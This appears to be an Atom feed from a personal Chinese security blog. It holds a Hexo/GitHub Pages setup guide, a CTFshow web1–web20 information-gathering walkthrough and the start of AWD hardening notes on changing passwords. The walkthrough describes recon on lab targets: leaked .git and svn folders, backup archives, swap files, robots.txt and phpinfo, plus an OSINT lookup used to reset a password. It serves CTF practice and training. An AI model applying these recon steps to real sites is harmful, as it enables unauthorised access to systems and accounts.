<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://blog.xcu.icu</id>
    <title></title>
    <subtitle></subtitle>
    <icon>https://blog.xcu.icu/images/favicon.ico</icon>
    <link href="https://blog.xcu.icu" />
    <author>
      <name>Clown</name>
    </author>
    <updated>2022-10-24T16:00:00.000Z</updated>
    <category term="Clown" />
    <category term="Web" />
    <category term="Pwn" />
    <category term="CTF" />
    <category term="AWD" />
    <category term="ACM" />
    <entry>
        <id>https://blog.xcu.icu/2022/10/25/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</id>
        <title>hexo+github搭建个人博客</title>
        <link rel="alternate" href="https://blog.xcu.icu/2022/10/25/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
        <content type="html">&lt;p&gt;应邀搭建一个小博客，hexo+github 搭建方便（重点是可以白嫖）&lt;/p&gt;
&lt;h3 id=&#34;环境配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#环境配置&#34;&gt;#&lt;/a&gt; 环境配置&lt;/h3&gt;
&lt;p&gt;安装 node.js----&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub2RlanMub3JnL2VuLw==&#34;&gt;Node.js 官网&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;安装完成后，使用命令 node -v，出现下面的信息则证明安装成功&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007204221944.png&#34; alt=&#34;image-20221007204221944&#34; /&gt;&lt;/p&gt;
&lt;p&gt;安装 git&lt;/p&gt;
&lt;p&gt;安装成功后执行命令 git --version&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007204532427.png&#34; alt=&#34;image-20221007204532427&#34; /&gt;&lt;/p&gt;
&lt;p&gt;GitHub 上面建立新的储存库&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007211507554.png&#34; alt=&#34;image-20221007211507554&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里有个地方需要注意，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS00Z3FhMDY3YmJhMjQ0Z3NsYTU4MGJkd2hlYTQ0NDlhYzE5Yi5naXRodWIuaW8=&#34;&gt;一是名字一定要是用户名.github.io&lt;/span&gt; (不然会有很多问题)&lt;/p&gt;
&lt;p&gt;进入建好的项目的设置按钮中&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007212119905.png&#34; alt=&#34;image-20221007212119905&#34; /&gt;&lt;/p&gt;
&lt;p&gt;打开这个链接就已经有部署到网络上面的网页&lt;/p&gt;
&lt;h3 id=&#34;安装hexo&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安装hexo&#34;&gt;#&lt;/a&gt; 安装 hexo&lt;/h3&gt;
&lt;p&gt;创建一个文件夹存放部署在本地的文件，我这里选择放在 F 盘&lt;/p&gt;
&lt;p&gt;在 dos 命令框中输入&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;npm install hexo -g，开始安装 Hexo&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;漫长等待安装完成后，输入 hexo 检查是否安装成功&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007214045244.png&#34; alt=&#34;image-20221007214045244&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;输入 hexo init 初始化文件夹（这个更慢，很烦下完两局象棋才结束）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007214356434.png&#34; alt=&#34;image-20221007214356434&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;输入 npm install，安装组件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007214417379.png&#34; alt=&#34;image-20221007214417379&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;输入 hexo s 开启服务器，访问该网址&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;git绑定github账号&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#git绑定github账号&#34;&gt;#&lt;/a&gt; Git 绑定 GIthub 账号&lt;/h3&gt;
&lt;p&gt;在 blog 文件夹里，右键选择 Git Base Here&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;$ git config --global user.name “账号”
$ git config --global user.email “邮箱”&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;输入 ssh-keygen -t rsa -C &amp;quot;你的邮箱&amp;quot;，无脑连续三个回车&lt;/p&gt;
&lt;p&gt;登录 Github，点击头像下的 settings，点击侧边栏 SSH and GPG keys，再点击 Add SSH Key，在 title 处填入任意的标识，在 Key 部分里面添加刚才复制的 id_rsa.pub 文件里的内容，点击添加即可&lt;/p&gt;
&lt;p&gt;输入 ssh -T &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOmdpdEBnaXRodWIuY29t&#34;&gt;git@github.com&lt;/span&gt;, 出现你的用户名则成功&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007221435449.png&#34; alt=&#34;image-20221007221435449&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;配置deployment&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配置deployment&#34;&gt;#&lt;/a&gt; 配置 Deployment&lt;/h3&gt;
&lt;p&gt;在 blog 目录下，找到_config.yml 文件，修改 repo 值（在末尾）&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;deploy:
	type: git 
	repository: git@github.com:WShaobin&amp;#x2F;WShaobin.github.io.git
	branch: master&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;repository 值是你在 github 项目里的 ssh（右下角）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007223433959.png&#34; alt=&#34;image-20221007223433959&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;部署到github&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#部署到github&#34;&gt;#&lt;/a&gt; 部署到 GitHub&lt;/h3&gt;
&lt;p&gt;右键 git bash here 执行命令： &lt;code&gt;hexo new post “文章”&lt;/code&gt;  或 &lt;code&gt;hexo new “文章”&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这时候在文件夹_posts 目录下将会看到已经创建的文件&lt;/p&gt;
&lt;p&gt;在生成以及部署文章之前，需要安装一个扩展： &lt;code&gt;npm install hexo-deployer-git --save&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用编辑器编好文章，那么就可以使用命令： &lt;code&gt;hexo d -g&lt;/code&gt; ，生成以及部署了&lt;/p&gt;
&lt;p&gt;部署成功后访问你的地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1lcXI5MjRhdnhvLmdpdGh1Yi5pbw==&#34;&gt;http:// 用户名.github.io&lt;/span&gt;。那么将看到生成的文章&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007223612104.png&#34; alt=&#34;image-20221007223612104&#34; /&gt;&lt;/p&gt;
</content>
        <updated>2022-10-24T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>https://blog.xcu.icu/2022/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
        <title>CTFshow-web入门信息收集</title>
        <link rel="alternate" href="https://blog.xcu.icu/2022/10/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
        <content type="html">&lt;h2 id=&#34;web1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web1&#34;&gt;#&lt;/a&gt; web1&lt;/h2&gt;
&lt;p&gt;CTRL+u 解决&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025111225748.png&#34; alt=&#34;image-20221025111225748&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web2&#34;&gt;#&lt;/a&gt; web2&lt;/h2&gt;
&lt;p&gt;同 web1&lt;/p&gt;
&lt;h2 id=&#34;web3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web3&#34;&gt;#&lt;/a&gt; web3&lt;/h2&gt;
&lt;p&gt;http 头中&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025111448297.png&#34; alt=&#34;image-20221025111448297&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web4&#34;&gt;#&lt;/a&gt; web4&lt;/h2&gt;
&lt;p&gt;查看 robots.txt&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025111605443.png&#34; alt=&#34;image-20221025111605443&#34; /&gt;&lt;/p&gt;
&lt;p&gt;访问 /flagishere.txt&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025111744010.png&#34; alt=&#34;image-20221025111744010&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web5&#34;&gt;#&lt;/a&gt; web5&lt;/h2&gt;
&lt;p&gt;访问 phps 下载源码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025112204400.png&#34; alt=&#34;image-20221025112204400&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web6&#34;&gt;#&lt;/a&gt; web6&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025112528587.png&#34; alt=&#34;image-20221025112528587&#34; /&gt;&lt;/p&gt;
&lt;p&gt;有 www.zip, 下载拿到 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025112615777.png&#34; alt=&#34;image-20221025112615777&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web7&#34;&gt;#&lt;/a&gt; web7&lt;/h2&gt;
&lt;p&gt;git 的源码泄露，直接访问.git/index.php&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025113123637.png&#34; alt=&#34;image-20221025113123637&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web8&#34;&gt;#&lt;/a&gt; web8&lt;/h2&gt;
&lt;p&gt;svn 源码泄露同上&lt;/p&gt;
&lt;h2 id=&#34;web9&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web9&#34;&gt;#&lt;/a&gt; web9&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025113301899.png&#34; alt=&#34;image-20221025113301899&#34; /&gt;&lt;/p&gt;
&lt;p&gt;修改文件时意外退出，生成缓存文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025113436950.png&#34; alt=&#34;image-20221025113436950&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web10&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web10&#34;&gt;#&lt;/a&gt; web10&lt;/h2&gt;
&lt;p&gt;查看 http 头部的 cookie 头&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025123327299.png&#34; alt=&#34;image-20221025123327299&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web11&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web11&#34;&gt;#&lt;/a&gt; web11&lt;/h2&gt;
&lt;p&gt;域名 dns 解析，设置说明&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025123858205.png&#34; alt=&#34;image-20221025123858205&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web12&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web12&#34;&gt;#&lt;/a&gt; web12&lt;/h2&gt;
&lt;p&gt;robots.txt 中写了后台登录连接&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124214192.png&#34; alt=&#34;image-20221025124214192&#34; /&gt;&lt;/p&gt;
&lt;p&gt;用户名 admin&lt;/p&gt;
&lt;p&gt;密码，页面上的手机号&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124407329.png&#34; alt=&#34;image-20221025124407329&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124438975.png&#34; alt=&#34;image-20221025124438975&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web13&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web13&#34;&gt;#&lt;/a&gt; web13&lt;/h2&gt;
&lt;p&gt;页面下方发现这个 pd 能下载&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124750410.png&#34; alt=&#34;image-20221025124750410&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124715623.png&#34; alt=&#34;image-20221025124715623&#34; /&gt;&lt;/p&gt;
&lt;p&gt;pdf 中有密码，去尝试登录，拿到 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025124945280.png&#34; alt=&#34;image-20221025124945280&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025125023387.png&#34; alt=&#34;image-20221025125023387&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web14&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web14&#34;&gt;#&lt;/a&gt; web14&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025125246077.png&#34; alt=&#34;image-20221025125246077&#34; /&gt;&lt;/p&gt;
&lt;p&gt;去访问，有一个文本编辑器页面，寻找 flag 文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025125742752.png&#34; alt=&#34;image-20221025125742752&#34; /&gt;&lt;/p&gt;
&lt;p&gt;访问文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025125808264.png&#34; alt=&#34;image-20221025125808264&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025125522527.png&#34; alt=&#34;image-20221025125522527&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web15&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web15&#34;&gt;#&lt;/a&gt; web15&lt;/h2&gt;
&lt;p&gt;发现有 admin 页面，先去访问&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130005877.png&#34; alt=&#34;image-20221025130005877&#34; /&gt;&lt;/p&gt;
&lt;p&gt;有登录页面，但是不知道密码，忘记密码需要知道地址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130113047.png&#34; alt=&#34;image-20221025130113047&#34; /&gt;&lt;/p&gt;
&lt;p&gt;主页找到了邮箱地址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130224266.png&#34; alt=&#34;image-20221025130224266&#34; /&gt;&lt;/p&gt;
&lt;p&gt;通过 qq 号查询地址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130433834.png&#34; alt=&#34;image-20221025130433834&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里应该是机器人资料改了，题目没更新，正确地址是西安&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130628154.png&#34; alt=&#34;image-20221025130628154&#34; /&gt;&lt;/p&gt;
&lt;p&gt;登录拿到 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025130719590.png&#34; alt=&#34;image-20221025130719590&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web16&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web16&#34;&gt;#&lt;/a&gt; web16&lt;/h2&gt;
&lt;p&gt;访问 tz.php,php 探针是用来探测空间、服务器运行状况和 PHP 信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025131257496.png&#34; alt=&#34;image-20221025131257496&#34; /&gt;&lt;/p&gt;
&lt;p&gt;打开 phpinfo 拿到 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025131333881.png&#34; alt=&#34;image-20221025131333881&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web17&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web17&#34;&gt;#&lt;/a&gt; web17&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025131929374.png&#34; alt=&#34;image-20221025131929374&#34; /&gt;&lt;/p&gt;
&lt;p&gt;访问，将下载的文件打开拿到 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025132102118.png&#34; alt=&#34;image-20221025132102118&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web18&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web18&#34;&gt;#&lt;/a&gt; web18&lt;/h2&gt;
&lt;p&gt;前端的验证，查看 js&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025145134964.png&#34; alt=&#34;image-20221025145134964&#34; /&gt;&lt;/p&gt;
&lt;p&gt;分数大于 100 分会有弹窗，url 解码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025145209107.png&#34; alt=&#34;image-20221025145209107&#34; /&gt;&lt;/p&gt;
&lt;p&gt;访问 110.php&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025145237831.png&#34; alt=&#34;image-20221025145237831&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web19&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web19&#34;&gt;#&lt;/a&gt; web19&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025145332644.png&#34; alt=&#34;image-20221025145332644&#34; /&gt;&lt;/p&gt;
&lt;p&gt;看到用户名密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025145912834.png&#34; alt=&#34;image-20221025145912834&#34; /&gt;&lt;/p&gt;
&lt;p&gt;登陆，拿到 flag&lt;/p&gt;
&lt;h2 id=&#34;web20&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web20&#34;&gt;#&lt;/a&gt; web20&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025150253122.png&#34; alt=&#34;image-20221025150253122&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这个目录下有东西，mdb 文件是早期 asp+access 构架的数据库文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025150409063.png&#34; alt=&#34;image-20221025150409063&#34; /&gt;&lt;/p&gt;
&lt;p&gt;访问&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025150541323.png&#34; alt=&#34;image-20221025150541323&#34; /&gt;&lt;/p&gt;
</content>
        <updated>2022-10-24T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>https://blog.xcu.icu/2022/10/24/awd-web%E5%B0%8F%E7%BB%93/</id>
        <title>Awd-web小结</title>
        <link rel="alternate" href="https://blog.xcu.icu/2022/10/24/awd-web%E5%B0%8F%E7%BB%93/"/>
        <content type="html">&lt;h2 id=&#34;查看比赛信息-规则&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看比赛信息-规则&#34;&gt;#&lt;/a&gt; 查看比赛信息、规则&lt;/h2&gt;
&lt;p&gt;注意赛方的限制比如说提交 flag 的间隔时间，flag 的获取方式，通防的限制，对后门的处理要求等要注意的点，避免 check 丢分&lt;/p&gt;
&lt;h2 id=&#34;改密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#改密码&#34;&gt;#&lt;/a&gt; 改密码&lt;/h2&gt;
&lt;p&gt;awd 模式每个队伍会有若干台服务器需要维护，如果主办方平台给的密码较为简单存在弱口令或者可能被爆破成功的机会，尽快修改密码，密码主要是三个方面：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ssh 连接密码即本地密码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-ABAP&#34; data-language=&#34;ABAP&#34;&gt;&lt;code class=&#34;language-ABAP&#34;&gt;passwd &amp;#123;用户名&amp;#125;
做修改即可&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MySQL 登录密码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-apl&#34; data-language=&#34;apl&#34;&gt;&lt;code class=&#34;language-apl&#34;&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token dyadic-operator operator&#34;&gt;.&lt;/span&gt; 使用 SET PASSWORD 命令
步骤 &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;：输入命令mysql &lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;u root &lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;p指定 root 用户登录 MySQL，输入后按回车键输入密码。如果没有配置环境变量，请在 MySQL 的 bin 目录下登录操作。

步骤 &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;：使用 SET PASSWORD 修改密码命令格式为 set password for username &lt;span class=&#34;token dyadic-operator operator&#34;&gt;@&lt;/span&gt;localhost &lt;span class=&#34;token function&#34;&gt;=&lt;/span&gt; password&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;newpwd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
，其中 username 为要修改密码的用户名，newpwd 为要修改的新密码。

&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token dyadic-operator operator&#34;&gt;.&lt;/span&gt; 使用mysqladmin修改密码
使用 mysqladmin 命令修改 MySQL 的 root 用户密码格式为 mysqladmin &lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;u用户名 &lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;p旧密码 password 新密码。

注意：修改密码的命令中 &lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;uroot 和 &lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;proot 是整体，不要写成 &lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;u root &lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;p root，&lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;u 和 root 间可以加空格，但是会有警告出现，所以就不要加空格了。

&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token dyadic-operator operator&#34;&gt;.&lt;/span&gt; UPDATE直接编辑user表
步骤 &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;：输入命令mysql &lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;u root &lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;p指定 root 用户登录 MySQL，输入后按回车键输入密码。如果没有配置环境变量，请在 MySQL 的 bin 目录下登录操作。

步骤 &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;：输入use mysql&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;命令连接权限数据库。

步骤 &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;：输入命令update mysql&lt;span class=&#34;token dyadic-operator operator&#34;&gt;.&lt;/span&gt;user set authentication_string&lt;span class=&#34;token function&#34;&gt;=&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;新密码&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; where user&lt;span class=&#34;token function&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;用户名&#39;&lt;/span&gt; and Host &lt;span class=&#34;token function&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;localhost&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;设置新密码。

步骤 &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;：输入 flush privileges&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 命令刷新权限。

步骤 &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;：输入quit&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;命令退出 MySQL 重新登录，此时密码已经修改为刚才输入的新密码了。&lt;span aria-hidden=&#34;true&#34; 